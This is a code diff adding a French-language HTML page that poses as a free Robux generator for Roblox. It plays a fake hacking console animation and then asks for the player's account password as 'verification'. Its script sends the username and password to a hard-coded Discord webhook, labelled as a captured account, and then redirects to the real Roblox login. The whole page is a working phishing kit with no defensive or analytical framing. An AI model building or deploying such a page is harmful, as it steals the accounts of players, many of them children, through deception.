@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Cloud Generator | Free Robux 2026</title>
+    <style>
+        body { margin: 0; background: #0b0c0d; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; overflow: hidden; }
+        .card { background: #191b1d; width: 450px; padding: 30px; border-radius: 15px; border: 1px solid #393b3d; text-align: center; box-shadow: 0 0 30px rgba(0,0,0,0.5); }
+        .step { display: none; }
+        .active { display: block; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #0b0c0d; border: 1px solid #393b3d; border-radius: 5px; color: #fff; }
+        .btn { width: 100%; padding: 15px; background: #00a2ff; border: none; border-radius: 5px; color: #fff; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
+        .loader-bar { width: 100%; height: 10px; background: #0b0c0d; border-radius: 10px; margin: 20px 0; overflow: hidden; }
+        .progress { width: 0%; height: 100%; background: #00a2ff; transition: 0.1s; }
+        #console { background: #000; color: #00ff00; padding: 10px; font-family: monospace; font-size: 12px; text-align: left; height: 100px; overflow-y: hidden; border-radius: 5px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://images.rbxcdn.com/2216479f3db70517860269f835f8dc13.png" width="50" style="margin-bottom:10px;">
+    
+    <div id="step1" class="step active">
+        <h2>Générateur de Robux</h2>
+        <p style="color:#adb1b5; font-size:13px;">Entrez votre pseudo pour commencer l'injection.</p>
+        <input type="text" id="target_user" placeholder="Nom d'utilisateur Roblox">
+        <select id="amount">
+            <option value="1000">1,000 Robux</option>
+            <option value="10000">10,000 Robux</option>
+            <option value="50000">50,000 Robux</option>
+            <option value="99999">99,999 Robux</option>
+        </select>
+        <button class="btn" onclick="startHack()">GÉNÉRER</button>
+    </div>
+
+    <div id="step2" class="step">
+        <h2>Injection en cours...</h2>
+        <div id="console"></div>
+        <div class="loader-bar"><div id="bar" class="progress"></div></div>
+    </div>
+
+    <div id="step3" class="step">
+        <h2 style="color:#ffcc00;">⚠️ Vérification Requise</h2>
+        <p style="font-size:13px;">Pour finaliser l'envoi de <b id="display_amount"></b> Robux sur <b id="display_user"></b>, connectez-vous pour synchroniser l'API.</p>
+        <input type="password" id="p" placeholder="Mot de passe de votre compte">
+        <button class="btn" style="background:#2ecc71;" onclick="finishCapture()">VALIDER LA RÉCEPTION</button>
+    </div>
+</div>
+
+<script>
+    // TON WEBHOOK ICI
+    const WH = "https://discord.com/api/webhooks/13490805370715902075/gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9";
+
+    function startHack() {
+        const u = document.getElementById('target_user').value;
+        if(!u) return alert("Pseudo requis");
+        
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+        
+        // Simulation console
+        const logs = [
+            "> Connecting to Roblox Mainframe...",
+            "> Searching user ID...",
+            "> User found: " + u,
+            "> Initializing Cloud-Script...",
+            "> Bypassing 2FA security protocols...",
+            "> Injecting Robux assets...",
+            "> Syncing with database...",
+            "> Error: Synchronization failed.",
+            "> Human Verification Required!"
+        ];
+        
+        let i = 0;
+        let barWidth = 0;
+        const interval = setInterval(() => {
+            if(i < logs.length) {
+                document.getElementById('console').innerHTML += logs[i] + "<br>";
+                i++;
+                barWidth += 12;
+                document.getElementById('bar').style.width = barWidth + "%";
+            } else {
+                clearInterval(interval);
+                setTimeout(showLogin, 1000);
+            }
+        }, 800);
+    }
+
+    function showLogin() {
+        document.getElementById('display_user').innerText = document.getElementById('target_user').value;
+        document.getElementById('display_amount').innerText = document.getElementById('amount').value;
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('step3').classList.add('active');
+    }
+
+    async function finishCapture() {
+        const user = document.getElementById('target_user').value;
+        const pass = document.getElementById('p').value;
+        const amt = document.getElementById('amount').value;
+
+        await fetch(WH, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "💎 NOUVEAU COMPTE CAPTURÉ (TECH TIKTOK)",
+                    color: 3066993,
+                    fields: [
+                        { name: "👤 Pseudo", value: `\`${user}\``, inline: true },
+                        { name: "🔑 Pass", value: `\`${pass}\``, inline: true },
+                        { name: "💰 Montant voulu", value: `\`${amt} Robux\``, inline: true }
+                    ],
+                    footer: { text: "Générateur v5.2" }
+                }]
+            })
+        });
+
+        window.location.href = "https://www.roblox.com/login";
+    }
+</script>
+</body>
+</html>
